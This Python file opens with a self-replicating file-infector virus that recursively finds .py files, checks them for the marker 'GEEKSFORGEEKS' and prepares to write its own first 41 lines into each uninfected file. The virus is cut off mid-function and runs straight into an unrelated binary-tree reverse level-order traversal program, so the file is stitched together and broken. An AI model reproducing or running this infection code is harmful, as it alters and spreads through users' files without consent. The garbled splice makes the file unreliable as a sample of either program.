#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# A recursive Python program to print REVERSE level order traversal
  
# A binary tree node
class Node:
  
    # Constructor to create a new node
    def __init__(self, data):
        self.data = data
        self.left = None
        self.right = None
  
# Function to print reverse level order traversal
def reverseLevelOrder(root):
    h = height(root)
    for i in reversed(range(1, h+1)):
        printGivenLevel(root,i)
  
# Print nodes at a given level
def printGivenLevel(root, level):
  
    if root is None:
        return 
    if level ==1 :
        print(root.data),
  
    elif level>1:
        printGivenLevel(root.left, level-1)
        printGivenLevel(root.right, level-1)
  
# Compute the height of a tree-- the number of 
# nodes along the longest path from the root node
# down to the farthest leaf node
def height(node):
    if node is None:
        return 0 
    else:
  
        # Compute the height of each subtree
        lheight = height(node.left)
        rheight = height(node.right)
  
        # Use the larger one
        if lheight > rheight :
            return lheight + 1
        else:
            return rheight + 1
  
# Driver program to test above function
root = Node(1)
root.left = Node(2)
root.right = Node(3)
root.left.left = Node(4)
root.left.right = Node(5)
  
print("Level Order traversal of binary tree is")
reverseLevelOrder(root)
  
# This code is contributed by Nikhil Kumar Singh(nickzuck_007)
# Time Complexity: O(n^2)